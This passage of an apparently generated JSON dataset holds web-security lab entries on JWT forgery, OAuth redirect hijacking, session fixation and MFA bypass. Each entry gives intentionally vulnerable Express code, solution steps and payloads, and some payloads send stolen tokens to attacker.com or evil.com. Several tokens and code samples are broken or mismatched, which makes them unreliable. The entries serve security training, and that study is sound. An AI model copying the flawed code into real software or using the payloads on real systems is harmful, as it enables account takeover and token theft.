    "srcCode": "const express = require('express'); const app = express(); const tokenStore = { 'carlos': 'abcd.efgh.ijkl' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const token = tokenStore['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer abcd.efgh.ijkl') return res.send('Welcome Carlos!'); res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "http://attacker.com/callback#access_token=abcd.efgh.ijkl",
      "Malicious OAuth link: /auth?client_id=123&redirect_uri=http://evil.com/callback",
      "Authorization: Bearer abcd.efgh.ijkl"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass via 'none' algorithm in token validation logic",
    "Lab Description": "The application uses JWTs for session management but fails to properly verify the token's signature. Specifically, it accepts tokens with the 'none' algorithm without validating their integrity. This flaw allows attackers to forge tokens and impersonate other users. To solve: Forge a JWT for the 'admin' user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request containing a JWT after logging in.",
      "Decode the JWT using jwt.io or a similar tool to analyze its header and payload.",
      "Modify the header to set 'alg' to 'none' and change the payload's 'username' to 'admin'.",
      "Remove the signature part of the token, leaving only the header and payload.",
      "Replace the original JWT in the intercepted request with the forged token and resend the request to access the admin panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.use(express.json());\n\nconst users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }];\n\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  const user = users.find(u => u.username === username);\n  if (!user) return res.status(401).send('Invalid user');\n  const token = jwt.sign({ username: user.username, role: user.role }, 'secret');\n  res.json({ token });\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const payload = jwt.decode(token);\n  if (payload?.role !== 'admin') return res.status(403).send('Access denied');\n  res.send('Welcome to the admin panel');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth 2.0 misconfiguration in redirect URI validation",
    "Lab Description": "The application integrates with a third-party OAuth provider for authentication. However, it fails to properly validate the 'redirect_uri' parameter during the OAuth flow, allowing attackers to manipulate it and capture authorization codes meant for other users. To solve: Exploit the misconfiguration to obtain an access token for the 'admin' user and access the admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth authorization request and identify the 'redirect_uri' parameter.",
      "Modify the 'redirect_uri' to point to an attacker-controlled domain that captures authorization codes.",
      "Send a phishing link to the 'admin' user, tricking them into initiating the OAuth flow.",
      "Capture the authorization code from the redirected request to the attacker's domain.",
      "Exchange the captured authorization code for an access token and use it to access the admin dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\n\napp.get('/auth', (req, res) => {\n  const redirectUri = req.query.redirect_uri;\n  const authUrl = `https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=${redirectUri}`;\n  res.redirect(authUrl);\n});\n\napp.get('/callback', (req, res) => {\n  const code = req.query.code;\n  request.post('https://oauth.provider.com/token', {\n    form: {\n      grant_type: 'authorization_code',\n      code: code,\n      redirect_uri: 'https://app.com/callback',\n      client_id: 'client123',\n      client_secret: 'secret'\n    }\n  }, (error, response, body) => {\n    const accessToken = JSON.parse(body).access_token;\n    res.send(`Access token: ${accessToken}`);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
    "payloads": [
      "https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=https://attacker.com/callback",
      "https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=https://malicious.site/steal"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs in session management",
    "Lab Description": "The application assigns session IDs in a predictable manner and does not regenerate them upon user login. This flaw allows attackers to set a known session ID for a victim and hijack their session after they log in. To solve: Set a known session ID, trick the victim into logging in, and use the same session ID to access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to initiate a session with a specific session ID by setting the 'session_id' cookie.",
      "Send the session link with the fixed session ID to the victim, prompting them to log in.",
      "After the victim logs in, use the same session ID to access their account.",
      "Verify access by navigating to the user's dashboard or profile page.",
      "Log out and clear cookies to end the session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\nconst sessions = {};\n\napp.get('/login', (req, res) => {\n  const sessionId = req.cookies.session_id || 'guest';\n  sessions[sessionId] = { loggedIn: true, user: 'victim' };\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const session = sessions[sessionId];\n  if (session && session.loggedIn) {\n    res.send(`Welcome, ${session.user}`);\n  } else {\n    res.send('Please log in');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
    "payloads": [
      "Set-Cookie: session_id=knownsessionid123",
      "Set-Cookie: session_id=attackersession456"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid user request containing JWT using Burp Suite",
      "Decode the JWT in JWT Editor to analyze structure and claims",
      "Modify the alg header to 'none' and remove the signature section",
      "Add custom 'role':'admin' claim to the payload",
      "Submit the modified token to /admin endpoint and verify privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ."
    ]
  },
  {
    "Lab scenario": "GraphQL query batching attack in user enumeration",
    "Lab Description": "The GraphQL endpoint processes batched queries sequentially without rate limiting. The application leaks timing differences in error responses. To solve: identify valid usernames through differential response analysis using batched authentication attempts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture normal login attempt with OWASP ZAP",
      "Craft batched GraphQL query with 100 username variations",
      "Analyze response timing differences using Burp Suite's Compare feature",
      "Identify usernames with distinct response characteristics",
      "Perform targeted password spraying against identified accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Query {\n    login(username: String!, password: String!): Boolean\n  }\n`;\nconst resolvers = {\n  Query: {\n    login: (_, { username, password }) => {\n      if(username === 'admin') {\n        return password === 'secret123';\n      }\n      return false;\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
    "payloads": [
      "[{\"query\":\"query($input: LoginInput!) { login(input: $input) }\",\"variables\":{\"input\":{\"username\":\"user1\",\"password\":\"pass\"}}},{\"query\":\"query($input: LoginInput!) { login(input: $input) }\",\"variables\":{\"input\":{\"username\":\"user2\",\"password\":\"pass\"}}}]",
      "{\"query\":\"query { first: login(username: \\\"admin\\\", password: \\\"guess1\\\") second: login(username: \\\"test\\\", password: \\\"guess2\\\") }\"}",
      "{\"query\":\"mutation { logins: batchLogin(inputs: [{username: \\\"carlos\\\", password: \\\"test\\\"}, {username: \\\"admin\\\", password: \\\"test\\\"}]) }\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through insecure redirect_uri",
    "Lab Description": "The OAuth implementation fails to validate redirect_uri parameters properly. The application leaks authorization codes to attacker-controlled domains. To solve: intercept the OAuth flow and redirect the authorization code to your exploit server.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow with Postman using attacker-controlled redirect_uri",
      "Intercept authorization request with Burp Suite and modify redirect_uri",
      "Capture authorization code from callback URL",
      "Exchange code for access token at OAuth token endpoint",
      "Use stolen token to authenticate as victim user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = { 'client123': { secret: 'sec123', redirectUris: ['https://legit.com/callback'] } };\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'AUTH_CODE_' + Math.random().toString(36).substr(2,8);\n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'ACCESS_TOKEN_' + code });\n  } else {\n    res.status(401).send('Invalid client');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://oauth-victim.com/authorize?response_type=code&client_id=client123&redirect_uri=https://attacker.com/callback&state=123",
      "https://oauth-victim.com/authorize?response_type=token&client_id=client123&redirect_uri=http://localhost:9999&scope=all",
      "https://oauth-victim.com/authorize?response_type=code&client_id=client123&redirect_uri=https://legit.com/callback.attacker.com&state=xyz"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-set Session-ID in OAuth callback",
    "Lab Description": "The OAuth implementation sets predictable session IDs before authentication. The application maintains the same session after privilege elevation. To solve: fixate a session ID before authentication and reuse it post-OAuth flow to gain admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept OAuth initiation request with Burp Suite and note session cookie",
      "Manually set this session cookie in browser before authentication",
      "Complete OAuth flow with a low-privilege test account",
      "Modify the callback request to include admin claim",
      "Reuse original session cookie to access admin dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({\n  secret: 'weaksecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\napp.get('/oauth-callback', (req, res) => {\n  req.session.user = req.query.user;\n  req.session.role = req.query.role || 'user';\n  res.redirect('/dashboard');\n});\napp.get('/dashboard', (req, res) => {\n  if(req.session.role === 'admin') {\n    res.send('Admin panel');\n  } else {\n    res.send('User dashboard');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "/oauth-callback?user=attacker&role=admin",
      "/oauth-callback?user=admin&__proto__.role=admin",
      "/oauth-callback?user=carlos&role=admin&override=1"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The JWT verification uses kid header to load keys from filesystem without proper sanitization. The application's debug endpoint leaks key paths. To solve: craft a JWT with kid pointing to known public key file and sign with corresponding private key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover /debug endpoint revealing key storage location using OWASP ZAP",
      "Extract default public key path from debug information",
      "Craft JWT with kid header pointing to /etc/passwd",
      "Identify valid key path via error message differences",
      "Generate valid token using found key path and access admin API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/debug', (req, res) => {\n  res.json({ keyPath: '/var/keys/app_rsa.pub' });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  const keyPath = decoded.header.kid || '/var/keys/app_rsa.pub';\n  try {\n    const key = fs.readFileSync(keyPath);\n    jwt.verify(token, key);\n    res.send('Valid token');\n  } catch (e) {\n    res.status(403).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii92YXIva2V5cy9hcHBfcnNhLnB1YiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.NsZXBhc3N3ZA",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ob21lL3VzZXIvLnNzaC9pZF9yc2EucHViIn0.eyJzdWIiOiJyb290Iiwicm9sZSI6InN1cGVyX2FkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.KJHGFDSA"
    ]
  },
  {
    "Lab scenario": "MFA bypass through state parameter manipulation in SAML flow",
    "Lab Description": "The SAML implementation improperly validates state parameters during MFA initiation. The application skips MFA when receiving crafted state values. To solve: intercept SAML response and modify state parameter to known bypass value.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture normal SAML authentication flow using Burp Suite",
      "Identify state parameter in MFA initiation request",
      "Replay request with state=bypass in Postman",
      "Observe successful authentication without MFA prompt",
      "Modify SAML response to target admin user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst sessions = {};\napp.post('/saml/acs', (req, res) => {\n  const { SAMLResponse, RelayState } = req.body;\n  if(RelayState === 'bypass_mfa') {\n    sessions[req.ip] = { user: req.body.user, mfa: true };\n    res.redirect('/admin');\n  } else {\n    res.redirect('/mfa');\n  }\n});\napp.get('/admin', (req, res) => {\n  if(sessions[req.ip]?.mfa) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=bypass_mfa&user=admin",
      "SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjxyZWxheVN0YXRlPmJ5cGFzc19tZmE8L3JlbGF5U3RhdGU%2BPC9zYW1scDpSZXNwb25zZT4%3D",
      "SAMLResponse=valid_response&RelayState=bypass_mfa&user=carlos&mfa=0"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys. The application doesn't restrict allowed domains for key URLs. To solve: host a malicious public key and craft a JWT pointing to it with admin claims.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze structure",
      "Set up attacker-controlled server hosting crafted public key",
      "Modify JWT header to include jku pointing to malicious key",
      "Add admin claims and sign with corresponding private key",
      "Submit forged token to /admin endpoint for privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  let key;\n  if (decoded.header.jku) {\n    key = (await axios.get(decoded.header.jku)).data;\n  } else {\n    key = process.env.DEFAULT_KEY;\n  }\n  try {\n    jwt.verify(token, key);\n    res.json({ access: decoded.payload.role === 'admin' ? 'granted' : 'denied' });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20va2V5LnB1YiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.SIGNADURA",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9tYWxpY2lvdXMta2V5In0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9.U2lnbmVk",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC5leGFtcGxlL2tleS5qc29uIn0.eyJyb2xlIjoic3VwZXJhZG1pbiJ9.S1lNVEhFUkU"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through open redirect in mobile client",
    "Lab Description": "The mobile OAuth flow fails to validate redirect URIs properly when handling deep links. The application leaks access tokens to arbitrary domains via 302 redirects. To solve: chain an open redirect with the OAuth callback to intercept the token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify mobile deep link handler (/mobile-auth) with OWASP ZAP",
      "Find open redirect vulnerability in /redirect endpoint",
      "Craft malicious URL chaining redirect with OAuth callback",
      "Lure victim to click link (simulated in lab)",
      "Capture access token from attacker-controlled server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst tokens = {};\napp.get('/mobile-auth', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const token = 'tok_' + Math.random().toString(36).substr(2);\n  tokens[token] = { client_id, user: 'mobile_user' };\n  res.redirect(`${redirect_uri}?token=${token}`);\n});\napp.get('/redirect', (req, res) => {\n  res.redirect(req.query.url);\n});\napp.get('/oauth-callback', (req, res) => {\n  if (tokens[req.query.token]) {\n    res.send('Authenticated');\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "/mobile-auth?client_id=trusted_app&redirect_uri=/redirect?url=https://attacker.com",
      "/mobile-auth?client_id=mobile_client&redirect_uri=/redirect%3Furl%3Dhttp://evil.com/steal",
      "/mobile-auth?client_id=legit&redirect_uri=javascript:fetch('https://attacker.com/?token='+document.location.search)"
    ]
  },
  {
    "Lab scenario": "Session hijacking through WebSocket authentication bypass",
    "Lab Description": "The WebSocket upgrade request reuses HTTP session cookies without revalidation. The application maintains WebSocket connections after session expiration. To solve: hijack active WebSocket connection by replaying captured cookie during upgrade.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake with Burp Suite",
      "Note session cookie in Connection: Upgrade request",
      "Allow victim to authenticate and establish WebSocket",
      "Replay handshake with captured cookie during victim's active session",
      "Intercept and modify privileged WebSocket messages"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const cookies = require('cookie').parse(req.headers.cookie || '');\n  if (sessions[cookies.session]) {\n    ws.user = sessions[cookies.session];\n    ws.send(`Welcome back ${ws.user}`);\n  } else {\n    ws.close(1008, 'Invalid session');\n  }\n});\napp.post('/login', (req, res) => {\n  sessions[Math.random().toString(36)] = req.body.user;\n  res.send('Logged in');\n});",
    "payloads": [
      "GET /chat HTTP/1.1\r\nHost: victim.com\r\nCookie: session=stolen_session_id\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
      "{\"user\":\"attacker\",\"session\":\"valid_session_id\"}",
      "ws://victim.com/ws?session=highjacked_session"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via nested JSON parsing flaw",
    "Lab Description": "The JWT verification improperly handles nested JSON structures in claims. The application's deep object merging overwrites security controls. To solve: inject admin privileges through crafted nested claims in a valid JWT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and decode structure",
      "Identify claim merging behavior through fuzzing with Postman",
      "Craft nested JSON structure with conflicting admin claim",
      "Sign modified token using leaked debug endpoint credentials",
      "Submit to /admin-api endpoint and verify privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst deepmerge = require('deepmerge');\nconst app = express();\nconst DEFAULT_CLAIMS = { user: 'guest', roles: ['public'] };\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.verify(token, process.env.SECRET);\n    const claims = deepmerge(DEFAULT_CLAIMS, decoded);\n    if (claims.roles.includes('admin')) {\n      res.send('Admin access granted');\n    } else {\n      res.status(403).send('Access denied');\n    }\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZXMiOlsidXNlciJdLCJfX3Byb3RvX18iOnsicm9sZXMiOlsicHVibGljIiwiYWRtaW4iXX19.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGFpbXMiOnsicm9sZXMiOlsidXNlciJdfSwiY2xhaW1zIjp7InJvbGVzIjpbImFkbWluIl19fQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlcyI6WyJwdWJsaWMiXSwiX2NvbnRleHQiOnsicm9sZXMiOlsiYWRtaW4iXX19.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping through parameter pollution",
    "Lab Description": "The OAuth token exchange endpoint is vulnerable to HTTP parameter pollution. The application uses the first token parameter while logging the last. To solve: swap tokens during the exchange flow to gain elevated privileges.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth token exchange with Burp Suite",
      "Identify duplicate token parameters in POST body",
      "Craft request with attacker token first and victim token last",
      "Verify token mismatch in server logs via debug endpoint",
      "Use swapped token to access privileged resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst tokens = {\n  'user_token': { scope: 'read' },\n  'admin_token': { scope: 'read write admin' }\n};\napp.post('/token', (req, res) => {\n  const token = Array.isArray(req.body.token) ? req.body.token[0] : req.body.token;\n  console.log('Token used:', req.body.token);\n  if (tokens[token]) {\n    res.json(tokens[token]);\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "token=admin_token&token=user_token",
      "token[]=admin_token&token[]=user_token",
      "token=attacker_token&access_token=victim_token&token=admin_token"
    ]
  },
  {
    "Lab scenario": "Session fixation through GraphQL batch query caching",
    "Lab Description": "The GraphQL endpoint caches session tokens improperly when processing batch queries. The application reuses the first valid session for subsequent operations. To solve: fixate session through batch query and hijack victim's authenticated state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover GraphQL batch endpoint using OWASP ZAP",
      "Capture valid session token from test account",
      "Craft batch query mixing session operations",
      "Verify session inheritance through debug logs",
      "Execute privileged mutations with hijacked session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst app = express();\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n  }\n  type Mutation {\n    setSession(token: String): String\n    adminAction: String\n  }\n`);\nlet currentSession = null;\nconst root = {\n  getSession: () => currentSession,\n  setSession: ({token}) => {\n    currentSession = token;\n    return 'Session set';\n  },\n  adminAction: () => {\n    return currentSession === 'admin_token' ? 'Success' : 'Denied';\n  }\n};\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  batch: true\n}));\napp.listen(3000);",
    "payloads": [
      "[{\"query\":\"mutation {setSession(token: \\\"attacker_token\\\")}\"},{\"query\":\"mutation {setSession(token: \\\"victim_token\\\")}\"},{\"query\":\"mutation {adminAction}\"}]",
      "{\"query\":\"mutation {first: setSession(token: \\\"admin_token\\\") second: adminAction}\"}",
      "[{\"query\":\"mutation {setSession(token: \\\"fixed_session\\\")}\"},{\"query\":\"mutation {adminAction}\"}]"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via leaked debug endpoint",
    "Lab Description": "The application exposes a debug endpoint that leaks the public key used for JWT verification. The JWT implementation is vulnerable to algorithm confusion attacks. To solve: obtain the public key, craft an HS256-signed token with admin claims, and bypass authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover /debug endpoint using OWASP ZAP directory brute-forcing",
      "Extract public key from debug response",
      "Modify JWT header to use HS256 algorithm",
      "Sign token with leaked public key as HMAC secret",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\nconst publicKey = fs.readFileSync('./public.key');\napp.get('/debug', (req, res) => {\n  res.json({ publicKey: publicKey.toString() });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] });\n    res.json({ access: decoded.role === 'admin' ? 'granted' : 'denied' });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.LteI-Z9G6QkY2wNIMr24Ld5q4f3xZQZ2x3h3k6W3ZkA",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicHJpdmlsZWdlIjoic3VwZXJ1c2VyIiwicm9sZSI6ImFkbWluIn0.4j5E5QhJ3qz7Q5Q7X5Q7X5Q7X5Q7X5Q7X5Q7X5Q7X5Q"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
    "Lab Description": "The OAuth implementation in the Single Page Application has overly permissive CORS headers. The application leaks access tokens to arbitrary origins through XHR requests. To solve: craft a malicious page that steals OAuth tokens via CORS and uses them to access protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth callback endpoint with Burp Suite",
      "Analyze CORS headers for permissive settings",
      "Create attacker page with XMLHttpRequest to OAuth endpoint",
      "Lure victim to visit malicious page (simulated in lab)",
      "Capture token from server response and use in Postman"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: '*',\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Authorization']\n}));\nconst tokens = {};\napp.get('/oauth/callback', (req, res) => {\n  const token = 'tok_' + Math.random().toString(36).substr(2);\n  tokens[token] = { user: req.query.user || 'anonymous' };\n  res.json({ access_token: token });\n});\napp.get('/api/profile', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (tokens[token]) {\n    res.json({ email: 'admin@example.com', role: 'admin' });\n  } else {\n    res.status(401).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "<script>fetch('http://victim.com/oauth/callback?user=admin').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal?token='+d.access_token))</script>",
      "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://victim.com/api/profile'); xhr.withCredentials = true; xhr.send();",
      "fetch('http://victim.com/oauth/callback', {method: 'POST', headers: {'Origin': 'http://evil.com'}, body: JSON.stringify({user: 'admin'})})"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake parameter injection",
    "Lab Description": "The WebSocket upgrade process improperly handles session identifiers passed as URL parameters. The application accepts WebSocket session IDs through query strings without validation. To solve: fixate a session ID through crafted WebSocket URL and hijack victim's authenticated connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp Suite",
      "Identify session parameter in upgrade request",
      "Generate fixation token and craft WebSocket URL",
      "Trigger victim authentication (simulated in lab)",
      "Reuse fixated session via WebSocket client"
    ],
    "Vulnerability name": "Authentication",
